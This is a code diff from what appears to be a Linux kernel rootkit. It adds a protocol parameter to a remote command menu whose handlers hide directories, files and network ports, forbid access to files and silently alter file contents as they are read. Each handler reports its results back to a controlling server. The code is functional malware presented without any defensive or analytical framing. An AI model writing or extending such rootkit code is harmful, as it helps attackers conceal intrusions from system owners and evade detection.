@@ -9,19 +9,19 @@
 #include "forbid_api.h"
 #include "hide_api.h"
 
-static int hide_dir_handler(char *args);
-static int unhide_dir_handler(char *args);
-static int forbid_file_handler(char *args);
-static int unforbid_file_handler(char *args);
-static int list_hidden_handler(char *args);
-static int list_forbidden_handler(char *args);
-static int list_alterate_handler(char *args);
-static int unmodify_file_handler(char *args);
-static int modify_file_handler(char *args);
-static int hide_port_handler(char *args);
-static int unhide_port_handler(char *args);
-static int list_hidden_port_handler(char *args);
-static int hooks_help(char *args);
+static int hide_dir_handler(char *args, enum Protocol protocol);
+static int unhide_dir_handler(char *args, enum Protocol protocol);
+static int forbid_file_handler(char *args, enum Protocol protocol);
+static int unforbid_file_handler(char *args, enum Protocol protocol);
+static int list_hidden_handler(char *args, enum Protocol protocol);
+static int list_forbidden_handler(char *args, enum Protocol protocol);
+static int list_alterate_handler(char *args, enum Protocol protocol);
+static int unmodify_file_handler(char *args, enum Protocol protocol);
+static int modify_file_handler(char *args, enum Protocol protocol);
+static int hide_port_handler(char *args, enum Protocol protocol);
+static int unhide_port_handler(char *args, enum Protocol protocol);
+static int list_hidden_port_handler(char *args, enum Protocol protocol);
+static int hooks_help(char *args, enum Protocol protocol);
 
 // hooks menu commands, must start with 'hooks' to be recognized
 static struct command hooks_commands[] = {
@@ -45,7 +45,7 @@ static struct command hooks_commands[] = {
     { NULL, 0, NULL, 0, NULL }
 };
 
-static int hooks_help(char *args) {
+static int hooks_help(char *args, enum Protocol protocol) {
     int i;
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int off = snprintf(buf, STD_BUFFER_SIZE, "Available hooks commands:\n");
@@ -54,122 +54,122 @@ static int hooks_help(char *args) {
         if (off >= STD_BUFFER_SIZE)
             break;
     }
-    send_to_server("%s", buf);
+    send_to_server(protocol, "%s", buf);
     kfree(buf);
     return 0;
 }
 
-static int hide_port_handler(char *args) {
+static int hide_port_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = hide_port(args);
     if (r == SUCCESS)
-        send_to_server("Hidden: %s\n", args);
+        send_to_server(protocol, "Hidden: %s\n", args);
     else
-        send_to_server("Error hiding %s: %d\n", args, r);
+        send_to_server(protocol, "Error hiding %s: %d\n", args, r);
     return r;
 };
 
-static int unhide_port_handler(char *args) {
+static int unhide_port_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = unhide_port(args);
     if (r == SUCCESS)
-        send_to_server("Unhidden: %s\n", args);
+        send_to_server(protocol, "Unhidden: %s\n", args);
     else
-        send_to_server("Error unhiding %s: %d\n", args, r);
+        send_to_server(protocol, "Error unhiding %s: %d\n", args, r);
     return r;
 };
 
-static int list_hidden_port_handler(char *args) {
+static int list_hidden_port_handler(char *args, enum Protocol protocol) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int len = port_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
-        send_to_server("No hidden entries");
+        send_to_server(protocol, "No hidden entries");
     else
-        send_to_server("%s", buf);
+        send_to_server(protocol, "%s", buf);
     kfree(buf);
     return len;
 };
 
-static int hide_dir_handler(char *args) {
+static int hide_dir_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = hide_file(args);
     if (r == SUCCESS)
-        send_to_server("Hidden: %s\n", args);
+        send_to_server(protocol, "Hidden: %s\n", args);
     else
-        send_to_server("Error hiding %s: %d\n", args, r);
+        send_to_server(protocol, "Error hiding %s: %d\n", args, r);
     return r;
 }
 
-static int unhide_dir_handler(char *args) {
+static int unhide_dir_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = unhide_file(args);
     if (r == SUCCESS)
-        send_to_server("Unhidden: %s\n", args);
+        send_to_server(protocol, "Unhidden: %s\n", args);
     else
-        send_to_server("Error unhide %s: %d\n", args, r);
+        send_to_server(protocol, "Error unhide %s: %d\n", args, r);
     return r;
 }
 
-static int forbid_file_handler(char *args) {
+static int forbid_file_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = forbid_file(args);
     if (r == SUCCESS)
-        send_to_server("Forbidden: %s\n", args);
+        send_to_server(protocol, "Forbidden: %s\n", args);
     else
-        send_to_server("Error forbidding %s: %d\n", args, r);
+        send_to_server(protocol, "Error forbidding %s: %d\n", args, r);
     return r;
 }
 
-static int unforbid_file_handler(char *args) {
+static int unforbid_file_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = unforbid_file(args);
     if (r == SUCCESS)
-        send_to_server("Unforbidden: %s\n", args);
+        send_to_server(protocol, "Unforbidden: %s\n", args);
     else
-        send_to_server("Error unforbid %s: %d\n", args, r);
+        send_to_server(protocol, "Error unforbid %s: %d\n", args, r);
     return r;
 }
 
-static int list_hidden_handler(char *args) {
+static int list_hidden_handler(char *args, enum Protocol protocol) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int len = hide_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
-        send_to_server("No hidden entries\n");
+        send_to_server(protocol, "No hidden entries\n");
     else
-        send_to_server("%s", buf);
+        send_to_server(protocol, "%s", buf);
     kfree(buf);
     return 0;
 }
 
-static int list_forbidden_handler(char *args) {
+static int list_forbidden_handler(char *args, enum Protocol protocol) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int len = forbid_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
-        send_to_server("No forbidden entries\n");
+        send_to_server(protocol, "No forbidden entries\n");
     else
-        send_to_server("%s", buf);
+        send_to_server(protocol, "%s", buf);
     kfree(buf);
     return 0;
 }
 
-static int list_alterate_handler(char *args) {
+static int list_alterate_handler(char *args, enum Protocol protocol) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int len = alterate_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
-        send_to_server("No alterate rules, sorry.\n");
+        send_to_server(protocol, "No alterate rules, sorry.\n");
     else
-        send_to_server("%s", buf);
+        send_to_server(protocol, "%s", buf);
     kfree(buf);
     return 0;
 }
 
-static int modify_file_handler(char *args) {
+static int modify_file_handler(char *args, enum Protocol protocol) {
     // Parameters
     char *path;
     long hide_line = -1;
@@ -183,7 +183,7 @@ static int modify_file_handler(char *args) {
     // Get the first token
     path = strsep(&args, " ");
     if (!path || path[0] != '/') {
-        send_to_server("Usage: modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
+        send_to_server(protocol, "Usage: modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
         return -EINVAL;
     }
 
@@ -202,7 +202,7 @@ static int modify_file_handler(char *args) {
 
             char *src_tok = strsep(&pair, ":");
             if (!pair) {
-                send_to_server("Usage: replace=SRC:DST\n");
+                send_to_server(protocol, "Usage: replace=SRC:DST\n");
                 return -EINVAL;
             }
 
@@ -219,38 +219,38 @@ static int modify_file_handler(char *args) {
     }
 
     if (alterate_add(path, hide_line, hide_substr, replace_src, replace_dst) > 0)
-        send_to_server("Modified: %s\n", path);
+        send_to_server(protocol, "Modified: %s\n", path);
     else
-        send_to_server("Error modifying %s\n", path);
+        send_to_server(protocol, "Error modifying %s\n", path);
     return 0;
 }
 
-static int unmodify_file_handler(char *args) {
+static int unmodify_file_handler(char *args, enum Protocol protocol) {
     if (!args)
         return -EINVAL;
     int r = alterate_remove(args);
     if (r == SUCCESS)
-        send_to_server("Removed: %s\n", args);
+        send_to_server(protocol, "Removed: %s\n", args);
     else
-        send_to_server("Error while removing %s: %d\n", args, r);
+        send_to_server(protocol, "Error while removing %s: %d\n", args, r);
     return r;
 }
 
 // Dispatcher function
-int hooks_menu_handler(char *args) {
+int hooks_menu_handler(char *args, enum Protocol protocol) {
     char *cmd = strsep(&args, " \t");
 
     int i;
     if (!cmd)
-        return hooks_help(NULL);
+        return hooks_help(NULL, protocol);
 
     for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
         if (strncmp(cmd, hooks_commands[i].cmd_name, hooks_commands[i].cmd_name_size) == 0) {
             if (hooks_commands[i].cmd_handler)
-                return hooks_commands[i].cmd_handler(args);
+                return hooks_commands[i].cmd_handler(args, protocol);
         }
     }
 
-    send_to_server("Unknown hooks cmd '%s', try 'hooks help'\n", cmd);
+    send_to_server(protocol, "Unknown hooks cmd '%s', try 'hooks help'\n", cmd);
     return -EINVAL;
 }
